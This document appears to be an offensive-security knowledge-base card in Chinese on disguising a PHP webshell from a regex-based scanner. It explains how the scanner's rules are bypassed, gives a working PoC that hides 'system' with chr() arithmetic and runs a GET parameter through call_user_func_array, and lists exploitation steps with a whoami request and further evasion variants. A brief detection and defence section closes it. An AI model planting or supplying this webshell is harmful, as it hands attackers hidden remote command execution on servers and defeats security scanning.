---
id: web-php-rce-webshell-callback-wrapper-variable-function-regex-bypass
title: PHP WebShell 免杀：正则拦截「$变量(...)」调用形态时，改用 call_user_func_array 回调包装绕过
type: scenario
domain: web
path: web/php/rce
technique: php-webshell-callback-wrapper-dynamic-call-regex-bypass
aliases:
- call_user_func_array 绕过变量函数正则
- $f() 结构查杀绕过
- 变量函数调用正则免杀
- 回调包装动态调用
- 老式 WebShell 正则查杀绕过
tags:
- php
- webshell
- av-bypass
- callback
- dynamic-call
- regex-bypass
cve: []
severity: medium
confidence: medium
status: verified
created: '2026-11-11'
updated: '2026-11-12'
verification:
  verified_by: verifier-V554
  verified_at: '2026-11-12T00:31:00+08:00'
  notes: '已对照原文与16张图核对：ScanWebShell 1.1.1 的 Perl 规则表（eval/system/.../array_map 逐个枚举 + $[...]+\(.*?\) 结构规则）与正文逐条一致；img/07 扫描报出 @${asd}[_](...) 形态、img/08/12 报出 $f()、img/10 复扫无告警并显示 call_user_func_array($f,array($_GET[''aabyss''])) 代码；img/09 GET webshell.php?aabyss=whoami 回显 laptop-00rkdo96\12816，响应头 X-Powered-By: PHP/5.6.9，已据此把卡内误写的“原文实测环境为 PHP 7.0.9”修正为 PHP 5.6.9（该回调手法本身不限版本）。dedup 中 string-not-dynamic-call-av-bypass 与 name-rebuild-callback-goto-multilayer 为 likely_duplicate，读其 conclusion/PoC 后判定不同链：前者是 ~ 按位取反+array_map 隐藏关键字，后者是函数名分片+冷门回调+goto 多层免杀，二者均不针对“$变量(...)”结构正则；本卡核心是结构正则与 call_user_func_array 调用形态差分，保留合理。原文未给受影响版本（5.6.9 为测试环境），未设 affected_versions。PoC 未在本机执行。'
---

## 一句话结论

老式正则型 WebShell 查杀器（如 2013 年腾讯 TSRC 的 ScanWebShell）除了匹配 `eval`/`system` 等函数名，还会用 `\$[\w-_\'\\[\\]{}\.\$\*/|]+(\s|\/\*.*?\*\/)*\(.*?\)` 拦截一切「变量直接当函数调用」的语法形态（`$f(...)`、`@${$_}[_](...)` 都命中）；把调用点从 `$f($arg)` 换成 `call_user_func_array($f, array($arg))`，动态调用效果不变，但源码开头是普通标识符而非 `$`，该结构正则失效，且这份规则表没有把 `call_user_func_array` 列入高危函数名单，于是整份马在扫描器中零命中。

## 原理

- **规则匹配的是调用形态而非函数名**：该正则拆开是 `\$`（变量符号）+ `[\w-_\'\\[\\]{}\.\$\*/|]+`（变量名可用的字符集合，刻意包含 `[` `]` `{` `}` `$` 等以覆盖 `${$_}[_]` 这类可变变量写法）+ 可选空白/注释 + `\(.*?\)`（调用括号）。只要文件里出现「`$` 开头的一串字符紧跟括号」，无论是 `$f();` 还是 `@${$_}[_](@${$_}[__]);`，都会被这条规则命中——原文实测两种形态都被扫描器报出。
- **回调包装改变调用形态**：`call_user_func_array($f, array($_GET['aabyss']))` 中，`$f` 是作为**参数**传入，后面跟的是逗号而不是 `(`；真正的调用发生在 PHP 内置函数内部。正则要求 `$变量名` 后紧跟可选的空白/注释再紧跟 `(`，因此匹配不到这个形态。
- **规则表存在函数名单缺口**：该扫描器的黑名单是逐个函数名枚举的（`eval`、`assert`、`system`、`passthru`、`exec`、`pcntl_exec`、`shell_exec`、`popen`、`proc_open`、`preg_replace`、`create_function`、`ob_start`、`array_map` 等），并不包含 `call_user_func_array`/`call_user_func`，所以既躲过了「高危函数名」规则，也躲过了「变量函数调用」结构规则。
- **函数名仍可在运行时拼出**：`$f = chr(114+1).chr(120+1).chr(116-1).chr(117-1).chr(100+1).chr(108+1);` 逐字符拼出 `system`，源码里没有明文敏感词；`call_user_func_array` 再把它当 callable 执行。两层叠加后，静态特征只剩「一串 chr() 运算 + 一个正常内置函数调用」。
- **为什么仍能执行**：PHP 的 callable 机制允许字符串函数名在运行时解析，`call_user_func_array('system', ['whoami'])` 与 `system('whoami')` 等价；检测层看形态、执行层看语义，二者不一致即形成绕过。
- **边界**：只对「按固定字符类和函数名枚举」的正则扫描器有效。现代检测器会把 `call_user_func*`、`array_map` 等接受 callable 的函数整体标记为动态调用特征，或用 AST/字节码还原调用链；RASP/EDR 还能在运行时捕获 `system` 派生子进程。原文回调马实测环境为 PHP 5.6.9（响应头 X-Powered-By 可见），该回调手法本身不依赖特定 PHP 版本。

## 触发条件

- 查杀对象是正则/关键字型扫描器（原文为 Tencent ScanWebShell 1.1.1，2013 年 Perl 脚本），其规则包含「`$变量(...)` 调用形态」且未把 `call_user_func_array` 列入黑名单；
- 目标 PHP 未通过 `disable_functions` 禁用 `call_user_func_array` 及最终执行函数（`system`/`passthru` 等）；
- 文件能落地并被 PHP 解析（上传、写入、包含等前置独立）；
- 请求参数可控并进入 callable 的参数数组。

## 利用步骤

1. 先用最朴素的 `<?php $f(); ?>` 确认扫描器会报「变量函数调用」（原文扫描输出为 `webshell.php -> $f()`）。
2. 用 `chr()` 等构造最终执行函数名：`$f = chr(114+1).chr(120+1).chr(116-1).chr(117-1).chr(100+1).chr(108+1);` 得到 `system`。
3. 把调用形态改为回调包装：`call_user_func_array($f, array($_GET['aabyss']));`。
4. 用同一扫描器复扫，确认输出只剩 `start scanning ....` / `done !`，无命中行。
5. 访问 `webshell.php?aabyss=whoami` 验证执行（原文回显主机名 `laptop-00rkdo96\12816`），再替换为实际命令。

## PoC

```php
<?php
// 函数名逐字符拼接，避免明文 system；调用点用 call_user_func_array 包一层
$f = chr(114+1).chr(120+1).chr(116-1).chr(117-1).chr(100+1).chr(108+1); // "system"
call_user_func_array($f, array($_GET['aabyss']));
```

```http
GET /webshell.php?aabyss=whoami HTTP/1.1
Host: <target>
```

响应直接回显 `whoami` 结果；同一文件用 ScanWebShell 扫描无告警行。

## 变体与关联

- 变体：把 `call_user_func_array` 换成 `call_user_func`（同样不在该规则表里）、`array_map`（在名单内，需要再改名/拆分才能过）、`usort`/`uasort` 等 callable 形参函数。
- 变体：函数名不限于 `chr()` 拼接，也可用异或、取反、base64 解码等构造，与库内其它函数名隐藏卡叠加。
- 关联：[[web-php-rce-webshell-name-rebuild-callback-goto-multilayer]]（回调 sink + 函数名分片重建的系统化版本）、[[web-php-rce-webshell-obscure-callback-uintersect]]（冷门 callable 形参作 sink）、[[web-php-rce-webshell-string-not-dynamic-call-av-bypass]]（按位取反 + array_map 回调）、[[web-php-rce-webshell-invisible-char-variable-name-regex-bypass]]（同文的姐妹手法：不换调用点，改用不可见字符变量名让结构正则匹配失败）。
- 边界：若扫描器把「callable 形参被赋为变量/请求值」列为规则，或使用 AST 语义分析，本手法会重新暴露；改变调用形态不改变运行时行为。

## 检测与防御

- 检测：不要只匹配 `$变量(`；对 `call_user_func(_array)?`、`array_map`、`usort`、`register_shutdown_function` 等接受 callable 的函数，若其 callable 参数来自变量、拼接表达式或请求输入，应作为动态调用特征重点告警；配合 AST 还原函数名拼接链。
- 检测：识别「大量 `chr(`/`^`/`~`/`base64_decode` 运算 + 结果被传入 callable 参数」的组合。
- 防御：`disable_functions` 覆盖 `call_user_func_array`、`call_user_func`、`system`、`passthru`、`shell_exec`、`proc_open` 等；上传目录禁止 PHP 解析、Web 目录只读；使用语义级查杀（AST/字节码）与文件完整性监控；运行时用 RASP/EDR 监控 PHP 派生子进程。
